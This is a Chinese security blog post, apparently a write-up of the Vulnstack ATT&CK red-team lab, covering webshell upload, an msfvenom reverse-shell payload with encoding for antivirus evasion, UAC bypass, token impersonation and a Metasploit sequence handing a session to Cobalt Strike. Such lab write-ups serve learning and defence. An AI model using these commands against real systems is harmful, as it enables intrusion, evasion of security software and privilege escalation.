@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html>
+  
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <meta name="author" content="FengHLZ">
+  
+  
+  <title>ATT&amp;CK红队评估（一） | xyz|All</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="渗透测试,ATT&amp;CK实战系列,">
+  
+
+  
+  <meta name="description" content="项目地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">
+
+  
+
+  <script src="/js/av-min.js" async></script>
+
+  
+
+  
+    <script src="/js/Valine.min.js" async></script>
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"mB9CftyvuDc5gN6R44KukJtw-gzGzoHsz","appkey":"gRRwrnOXHglzMIz3blENWVJV","comment":true,"count":true},
+    welcome: {"enable":true,"interval":30},
+    start_time: "2018-07-09",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "FengHLZ",
+    share: {"twitter":true,"facebook":true,"weibo":true,"qq":true,"wechat":true},
+    mathjax: false,
+    page_type: ""
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+<script src="/js/jquery.min.js"></script>
+
+  
+    <link rel="icon" href="/images/siteimage.jpg">
+    <link rel="apple-touch-icon" href="/images/siteimage.jpg">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">FengHLZ.xyz</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | Know it - Do it</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self">友链</a>
+      
+        <a href="/about/index.html" target="_self">关于</a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/FengHLZ" target="_blank">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2020-03-05
+    </span>
+    
+      <span>
+        | <a href="/categories/渗透测试/"><i class="fa fa-bookmark"></i>渗透测试</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    ATT&CK红队评估（一）
+  </h1>
+  
+  <article class="passage-article">
+    <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="网络拓扑图"><a href="#网络拓扑图" class="headerlink" title="网络拓扑图"></a>网络拓扑图</h3><p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318155546.png" alt></p>
+<h3 id="靶机网卡及IP"><a href="#靶机网卡及IP" class="headerlink" title="靶机网卡及IP"></a>靶机网卡及IP</h3><ul>
+<li>kali攻击机：外网网卡；DHCP；192.168.91.130</li>
+<li>Windows 7：双网卡；外网IP：192.168.91.141；内网IP：192.168.52.143</li>
+<li>Win2k3：内网IP：192.168.52.141</li>
+<li>Windows server 2008 R2：内网IP：192.168.52.138</li>
+</ul>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>通过<code>yxcms</code>后台 弱口令 + 模板文件 getshell。具体不详细说明，本文章主要记录内网渗透的过程。</p>
+<p>使用<strong>蚁剑</strong>作为webshell管理工具，界面好看，支持中文。</p>
+<h3 id="MSF监听，反弹php-meterpreter"><a href="#MSF监听，反弹php-meterpreter" class="headerlink" title="MSF监听，反弹php-meterpreter"></a>MSF监听，反弹<code>php-meterpreter</code></h3><p>使用<code>msfvenom</code>生成<code>payload</code>文件，使用菜刀/蚁剑<strong>上传</strong>到WWW目录下：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318160847.png" alt></p>
+<p>使用<code>handler</code>模块接收反弹模块，在<code>7777</code>端口上进行监听，访问<code>test.php</code>，连接成功：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318161844.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318161940.png" alt></p>
+<h3 id="免杀payload"><a href="#免杀payload" class="headerlink" title="免杀payload"></a>免杀payload</h3><p>免杀这一块没有系统学习过，简单记录下：</p>
+<ol>
+<li><p>正对上述PHP的MSF大马，可以使用<strong>多层编码解码</strong>对大马原文件进行加密，对<strong>关键字进行拆解</strong>免杀：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318163629.png" alt></p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318163638.png" alt></p>
+<p><strong>关键字</strong>免杀：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318163709.png" alt></p>
+</li>
+<li><p>使用<code>msfvenom</code>生成payload，这里的payload<strong>不采取生成pe文件</strong>，而<strong>采取shellcode方式</strong>，来<strong>借助第三方</strong>直接加载到内存中</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 12 -b &#39;\x00\x0b&#39; LHOST=XXXXXXX LPORT=7777 -f  c</code></p>
+<p>编译为EXE文件并到目标主机上执行，即可免杀。</p>
+<p>学习链接：<a href="https://www.cnblogs.com/LyShark/p/11331476.html" target="_blank" rel="noopener">https://www.cnblogs.com/LyShark/p/11331476.html</a> 含多种语言多种编译后门方式。</p>
+</li>
+</ol>
+<h3 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h3><h4 id="UAC提权"><a href="#UAC提权" class="headerlink" title="UAC提权"></a>UAC提权</h4><p>首先<code>background</code>将当前会话保存到后台，<code>sessions</code>可以查看当前后台所有会话，每个session对应一个ID值，use进入模块，将参数session设置为噶保存的session ID值，直接exploit，执行成功后会返回一个新的meterpreter，getsystem就可获得system权限。</p>
+<p>原理参考<code>《网络攻防实战研究 漏洞利用与提权》</code></p>
+<p>此处已经是最高权限了，继续bypassuac，会提示：</p>
+<p><img src="https://figure-bed-1258919161.cos.ap-chengdu.myqcloud.com/md-img/20200318165636.png" alt></p>
+<h4 id="MS系列未修补的漏洞进行提权"><a href="#MS系列未修补的漏洞进行提权" class="headerlink" title="MS系列未修补的漏洞进行提权"></a>MS系列未修补的漏洞进行提权</h4><p><code>systeminfo</code>命令查看系统打了说明补丁。ms13-081、ms15-051、ms16-032、ms17-010等，search搜索模块，use使用模块，set session Id</p>
+<h4 id="通过假冒令牌提权"><a href="#通过假冒令牌提权" class="headerlink" title="通过假冒令牌提权"></a>通过假冒令牌提权</h4><p>用户登录windows操作系统时系统会给用户分配令牌，的那个用户访问资源系统是会使用令牌进行身份认证，若目标环境是域环境且域管理员登陆过有权限的终端即可假冒域管理员的角色<br>使用<code>use incognito</code>进入假冒令牌模块<br><code>list_tokens –u</code> 查看存在的令牌<br><code>impersonate_token</code> 用户名（\）</p>
+<p>具体参看书籍。</p>
+<h3 id="CS利用"><a href="#CS利用" class="headerlink" title="CS利用"></a>CS利用</h3><p>要获得<code>CS</code>的<code>beacon</code>，可以生成<strong>木马文件</strong>回弹<code>beacon</code>，也可以将MSF的<code>meterpreter</code>派生给<code>CS</code></p>
+<h4 id="MSF派生给CS"><a href="#MSF派生给CS" class="headerlink" title="MSF派生给CS"></a>MSF派生给CS</h4><p>执行<code>background</code>将会话放到后台，切换payload</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt;  use exploit/windows/<span class="built_in">local</span>/payload_inject</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_http</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> DisablePayloadHandler <span class="literal">true</span></span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> LHOST [Listener监听IP]</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> LPORT [Listener监听端口]</span><br><span class="line">msf exploit(payload_inject) &gt; <span class="built_in">set</span> SESSION [session ID]</span><br><span class="line">msf exploit(payload_inject) &gt; exploit</span><br></pre></td></tr></table></figure>
+  </article>
+  <aside class="table-content" id="site-toc">
+  <div class="table-content-title">
+    <i class="fa fa-arrow-right fa-lg" id="site-toc-hide-btn"></i>
+    <span>目录</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#环境搭建"><span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#网络拓扑图"><span class="toc-text">网络拓扑图</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#靶机网卡及IP"><span class="toc-text">靶机网卡及IP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-text">getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF监听，反弹php-meterpreter"><span class="toc-text">MSF监听，反弹php-meterpreter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#免杀payload"><span class="toc-text">免杀payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSF提权"><span class="toc-text">MSF提权</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#UAC提权"><span class="toc-text">UAC提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MS系列未修补的漏洞进行提权"><span class="toc-text">MS系列未修补的漏洞进行提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#通过假冒令牌提权"><span class="toc-text">通过假冒令牌提权</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CS利用"><span class="toc-text">CS利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF派生给CS"><span class="toc-text">MSF派生给CS</span></a></li></ol></li></ol></li></ol>
+  </div>
+</aside>
+  
+    <aside class="passage-copyright">
+      <div>本文作者: FengHLZ</div>
+      
+        <div>
+          原文链接: 
+          <a href="" target="_blank">https://www.fenghlz.xyz/passages/2020-03-05-ATT-CK红队评估（一）/</a>
+        </div>
+      
+      <div>
+        版权声明: 本博客所有文章除特别声明外, 均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议. 转载请注明出处!
+      </div>
+    </aside>
+  
+  
+    <div class="passage-tags">
+     
+      <a href="/tags/ATT-CK实战系列/"><i class="fa fa-tags"></i>ATT&CK实战系列</a>
+    
+    </div>
+  
+</div>
+
+    </main>
+    
+      <div class="site-comment-contanier">
+  <p id="site-comment-info">
+    <i class="fa fa-spinner fa-spin"></i> 评论加载中
+  </p>
+  <div id="site-comment">
+  </div>
+</div>
+    
+    <div class="site-footer-wrapper">
+  <footer class="site-footer">
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">博客推荐</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://xin-tan.com/" target="_blank">GodBMW</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">书签</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://leancloud.cn/" target="_blank">LeanCloud</a>
+          </span>
+        
+      </div>
+    
+      <div class="site-footer-col">
+        <h5 class="site-footer-title">在线工具</h5>
+        
+          <span class="site-footer-item">
+            <a href="https://www.ilovepdf.com/zh-cn" target="_blank">iLovePDF</a>
+          </span>
+        
+          <span class="site-footer-item">
+            <a href="https://www.iloveimg.com/zh-cn" target="_blank">iLoveIMG</a>
+          </span>
+        
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-clock-o"></i> 本站已稳定运行<span id="site-time"></span>
+    </div>
+    
+      <div class="site-footer-info">
+        <i class="fa fa-paw"></i> 您是本站第 <span id="site-count"></span> 位访客
+      </div>
+    
+    
+      <div class="site-footer-info">
+        <i class="fa fa-at"></i> Email: 2362929771@qq.com
+      </div>
+    
+    <div class="site-footer-info">
+      <i class="fa fa-copyright"></i> 
+      2019 <a href="https://github.com/dongyuanxin/theme-ad/" target="_blank">Theme-AD</a>.
+      Created by <a href="https://godbmw.com/" target="_blank">GodBMW</a>.
+      All rights reserved.
+    </div>
+  </footer>
+</div>
+    <div id="site-layer" style="display:none;">
+  <div class="site-layer-content" style="height:55%;width:40%;">
+    <div class="site-layer-header">
+      <span class="site-layer-header-title" id="site-layer-title"></span>
+      <i class="fa fa-close" id="site-layer-close"></i>
+    </div>
+    <div class="site-layer-body" id="site-layer-container">
+      <div class="site-layer-input" id="site-layer-search" style="display: none;">
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control"/>
+      </div>
+      <div class="site-layer-reward" id="site-layer-reward" style="display: none;">
+        
+          <div>
+            <img src="/images/wechatpay.png" alt="WeChat">
+            
+              <p>WeChat</p>
+            
+          </div>
+        
+          <div>
+            <img src="/images/alipay.jpg" alt="AliPay">
+            
+              <p>AliPay</p>
+            
+          </div>
+        
+      </div>
+      <div id="site-layer-welcome" style="display:none;"></div>
+    </div>
+    <div id="local-search-result" style="height:50%;display:none;"></div>
+  </div>
+</div>
+    
+
+<div class="bottom-bar">
+  <div></div>
+  <div class="bottom-bar-left">
+    <a href="/passages/2020-03-14-HTTP请求走私攻击/" data-enable="true">
+      <i class="fa fa-arrow-left"></i>
+    </a>
+    <a href="/passages/2020-02-22-提权知识学习-LIN-SECURITY靶场/" data-enable="true">
+      <i class="fa fa-arrow-right"></i>
+    </a>
+  </div>
+  <div class="bottom-bar-right">
+    <a href="javascript:void(0);" data-enable="true" id="site-toc-show-btn">
+      <i class="fa fa-bars"></i>
+    </a>
+    
+      <a href="#site-comment" data-enable="true">
+        <i class="fa fa-commenting"></i>
+      </a>
+    
+    <a href="javascript:void(0);" id="site-toggle-share-btn">
+      <i class="fa fa-share-alt"></i>
+    </a>
+    <a href="javascript:void(0);" id="site-reward">
+      <i class="fa fa-thumbs-up"></i>
+    </a>
+    <a href="javascript:void(0);" id="back-top-btn">
+      <i class="fa fa-chevron-up"></i>
+    </a>
+  </div>
+</div>
+    <div id="share-btn">
+  
+    <a id="share-btn-twitter" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-twitter"></i>
+    </a>
+  
+  
+    <a id="share-btn-facebook" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-facebook"></i>
+    </a>
+  
+  
+    <a id="share-btn-weibo" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-weibo"></i>
+    </a>
+  
+  
+    <a id="share-btn-qq" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-qq"></i>
+    </a>
+  
+  
+    <a id="share-btn-wechat" href="javascript:void(0);" target="_blank">
+      <i class="fa fa-wechat"></i>
+    </a>
+  
+</div>
+    
+  <script async src="https://www.googletagmanager.com/gtag/js?id="></script>
+  <script async>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', '');
+  </script>
+
+
+
+  <script async>
+  (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      if (curProtocol === 'https') {
+          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+      }
+      else {
+          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+      }
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+  })();
+  </script>
+
+
+
+  <script async>
+    (function(){
+    var src = (document.location.protocol == "http:") ? "http://js.passport.qihucdn.com/11.0.1.js?":"https://jspassport.ssl.qhimg.com/11.0.1.js?";
+    document.write('<script src="' + src + '" id="sozz"><\/script>');
+    })();
+  </script>
+
+
+  </body>
+</html>
